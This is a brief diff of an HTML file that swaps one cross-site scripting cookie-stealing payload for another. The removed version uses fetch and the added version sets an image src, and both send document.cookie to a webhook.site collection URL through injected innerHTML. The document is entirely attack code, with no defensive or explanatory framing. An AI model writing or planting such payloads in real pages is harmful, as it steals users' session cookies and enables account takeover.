@@ -2,8 +2,7 @@
 <html>
 <body>
   <script>
-      const xssPayload = '<img src="x"onerror="fetch(`https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215?cookie=`+encodeURIComponent(document.cookie))">';
-      document.body.innerHTML = xssPayload;
+    document.body.innerHTML = '<img src=x onerror="this.src=`	https://webhook.site/237f6f29-8cfd-4ef2-82c8-f4d61204c215ID?c=`+encodeURIComponent(document.cookie)">';
   </script>
 </body>
 </html>
